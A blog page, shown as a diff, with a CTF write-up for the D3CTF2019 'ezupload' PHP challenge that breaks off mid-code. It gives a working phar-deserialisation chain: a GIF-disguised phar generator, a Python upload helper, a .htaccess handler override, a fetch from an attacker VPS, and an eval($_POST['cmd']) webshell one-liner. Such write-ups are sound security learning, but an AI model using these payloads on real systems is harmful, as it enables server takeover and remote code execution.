@@ -1,0 +1,431 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>D3CTF2019-ezupload | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="题目链接
+访问得到源代码
+12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="D3CTF2019-ezupload"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												D3CTF2019-ezupload
+									
+									
+								</h1>
+								
+									<p id="/2023/08/10/D3CTF2019-ezupload/" class="leancloud-visitors view"
+										data-flag-title="D3CTF2019-ezupload">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1203">题目链接</a></p>
+<p>访问得到源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userdir = <span class="string">&quot;upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename  =  <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;userdir)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$this</span>-&gt;userdir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkdir</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;userdir != <span class="string">&quot;upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkurl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$r</span>[<span class="string">&#x27;scheme&#x27;</span>]) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|php/i&quot;</span>,<span class="variable">$r</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$this</span>-&gt;filename,<span class="string">&#x27;..&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$this</span>-&gt;filename,<span class="string">&#x27;/&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;filename, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$this</span>-&gt;filename, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkdir</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkurl</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkext</span>();</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;url,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?|value|on|type|flag|auto|set|\\\\/i&quot;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;userdir.<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;filename,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkdir</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkext</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;userdir.<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;userdir.<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$dir</span> === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$num</span> = <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$this</span>-&gt;userdir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$num</span> = <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$dir</span>)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;you have <span class="subst">$num</span> files&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;you don&#x27;t have file&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot; &quot;</span>,<span class="title function_ invoke__">scandir</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = <span class="string">&quot;your file in : &quot;</span>.<span class="variable language_">$this</span>-&gt;userdir;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename.<span class="string">&quot;.txt&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dir</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">upload</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&quot;count&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dir&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">count</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>-&gt;<span class="title function_ invoke__">count</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用post传入的 <code>url</code> 和 <code>filename</code> 创建dir对象</p>
+<p>upload: </p>
+<ol>
+<li>目录检查：是否被改</li>
+<li>url检查 ：必须包含scheme，且scheme不能包含 <code>file</code> 或 <code>php</code> ，但没有过滤 <code>data</code> 和 <code>phar</code> </li>
+<li>文件名后缀检查：不能包含ph</li>
+<li><code>file_get_contents</code> 获取url中的内容并过滤，<code>&lt;</code> 会被过滤，看来木马无法直接从内容上传</li>
+<li><code>file_put_contents</code> 将内容存入userdir&#x2F;filename</li>
+</ol>
+<p>count:</p>
+<p>展示上传目录文件数量，调用的话会发现文件会被定时删除</p>
+<p><strong>phar反序列化</strong></p>
+<blockquote>
+<p>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</p>
+</blockquote>
+<p>phar文件为php归档文件，相当于压缩包，可以存放多个文件，在被某些触发函数解析时 其中的MetaData会自动被反序列化（漏洞）</p>
+<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">触发函数（部分）</th>
+<th align="center"></th>
+<th align="center"></th>
+<th align="center"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">file_get_content</td>
+<td align="center">filectime</td>
+<td align="center">file_exists</td>
+<td align="center">file_get_contents</td>
+</tr>
+<tr>
+<td align="center">fileatime</td>
+<td align="center">file_put_contents</td>
+<td align="center">file</td>
+<td align="center">filegroup</td>
+</tr>
+<tr>
+<td align="center">fopen</td>
+<td align="center">fileinode</td>
+<td align="center">unlink</td>
+<td align="center">stat</td>
+</tr>
+<tr>
+<td align="center">fileowner</td>
+<td align="center">fileperms</td>
+<td align="center">is_dir</td>
+<td align="center">is_executable</td>
+</tr>
+<tr>
+<td align="center">is_file</td>
+<td align="center">copy</td>
+<td align="center">stat</td>
+<td align="center">readfile</td>
+</tr>
+</tbody></table>
+<ul>
+<li><p><code>$string = &quot;your file in : &quot;.$this-&gt;userdir;</code> 有可能触发 <code>__toString</code>，查看目录信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot; __HALT_COMPILER(); &quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="comment">/**按照攻击链条构造对象***/</span></span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dir</span>();</span><br><span class="line">   <span class="variable">$a</span>-&gt;userdir=<span class="string">&#x27;../&#x27;</span>;	</span><br><span class="line">   <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dir</span>();</span><br><span class="line">   <span class="variable">$o</span>-&gt;userdir=<span class="variable">$a</span>;</span><br><span class="line"><span class="comment">/***其余部分可作为模板***/</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将要反序列化的对象存入meta-data</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+
+<p>执行后生成 <code>phar.phar</code>文件，改为<code>phar.gif</code> </p>
+<p>上传脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getinfo</span>(<span class="params">purl, filename, action</span>):</span><br><span class="line">    post_data = &#123;<span class="string">&quot;url&quot;</span>: purl, <span class="string">&quot;filename&quot;</span>: filename, <span class="string">&quot;action&quot;</span>: action&#125;</span><br><span class="line">    response = requests.post(<span class="string">&quot;http://node2.anna.nssctf.cn:28055/&quot;</span>, data=post_data)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<p>可以用VPS上传至服务器，然后传</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getinfo(<span class="string">&#x27;http://xx.xx.xx.xx/phar.gif&#x27;</span>, <span class="string">&#x27;phar.gif&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>或直接获取base64编码然后用<code>data</code>伪协议上传</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">base64</span> phar.phar</span><br><span class="line">&lt; R0lGODlhIF9fSEFMVF9DT01QSUxFUigpOyA/Pg0KsgAAAAEAAAARAAAAAQAAAAAAfAAAAE86Mzoi</span><br><span class="line">ZGlyIjozOntzOjc6InVzZXJkaXIiO086MzoiZGlyIjozOntzOjc6InVzZXJkaXIiO3M6MzoiLi4v</span><br><span class="line">IjtzOjM6InVybCI7TjtzOjg6ImZpbGVuYW1lIjtOO31zOjM6InVybCI7TjtzOjg6ImZpbGVuYW1l</span><br><span class="line">IjtOO30IAAAAdGVzdC50eHQEAAAAZ5vUZAQAAAAMfn/YpAEAAAAAAAB0ZXN0blKehuzjSYAVLkjn</span><br><span class="line">JV2RJv5biehmVwrY/PBuUG3FIoQDAAAAR0JNQg==</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">&#x27;&#x27;&#x27;data://image/gif;base64,R0lGODlhIF9fSEFMVF9DT01QSUxFUigpOyA/Pg0KsgAAAAEAAAARAAAAAQAAAAAAfAAAAE86Mzoi</span></span><br><span class="line"><span class="string">ZGlyIjozOntzOjc6InVzZXJkaXIiO086MzoiZGlyIjozOntzOjc6InVzZXJkaXIiO3M6MzoiLi4v</span></span><br><span class="line"><span class="string">IjtzOjM6InVybCI7TjtzOjg6ImZpbGVuYW1lIjtOO31zOjM6InVybCI7TjtzOjg6ImZpbGVuYW1l</span></span><br><span class="line"><span class="string">IjtOO30IAAAAdGVzdC50eHQEAAAAZ5vUZAQAAAAMfn/YpAEAAAAAAAB0ZXN0blKehuzjSYAVLkjn</span></span><br><span class="line"><span class="string">JV2RJv5biehmVwrY/PBuUG3FIoQDAAAAR0JNQg==&#x27;&#x27;&#x27;</span></span><br><span class="line">getinfo(url, <span class="string">&#x27;phar.gif&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到上传到目录 <code>upload/e0ee64a13ff7a0b04333c1d51fbbeadf</code></p>
+</li>
+<li><p>上传<code>.htaccess</code> </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getinfo(<span class="string">&#x27;data://text/plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&#x27;</span>, <span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line"><span class="comment"># 内容为：AddHandler php7-script .txt</span></span><br><span class="line"><span class="comment"># 因为 &lt; 被过滤，这同样可以达到效果，将txt解释为php</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>现在有了phar文件，可以传phar:&#x2F;&#x2F;，在<code>file_get_contents</code>中触发反序列化</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getinfo(<span class="string">&#x27;phar://upload/e0ee64a13ff7a0b04333c1d51fbbeadf/phar.gif&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>得到 <code>your file in : upload/e0ee64a13ff7a0b04333c1d51fbbeadfyour file in : . .. 887a185b1a408019your file in : ../</code></p>
+<p>所以上传文件夹绝对路径为 <code>/var/html/www/887a185b1a408019/upload/e0ee64a13ff7a0b04333c1d51fbbeadf</code></p>
+</li>
+<li><p>现在还是通过反序列化使得此文件夹中某个文件包含木马</p>
+<p>由</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = <span class="string">&quot;your file in : &quot;</span>.<span class="variable language_">$this</span>-&gt;userdir;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename.<span class="string">&quot;.txt&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见<code>string</code> 和 <code>filename</code> 均可控，让 <code>string</code>中包含木马即可</p>
+</li>
+</ul>
+<h3 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h3><ul>
+<li><p>上传木马名称文件（文件名没有过滤那么严）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getinfo(<span class="string">&#x27;data://image/gif;base64,R0lG&#x27;</span>, <span class="string">&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;.txt&quot;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这时，当前文件夹下就包含有<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;.txt</code>，再类似前步反序列化展示文件夹下内容，然后就写到txt文件中</p>
+</li>
+<li><p>phar构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot; __HALT_COMPILER(); &quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">   <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dir</span>();</span><br><span 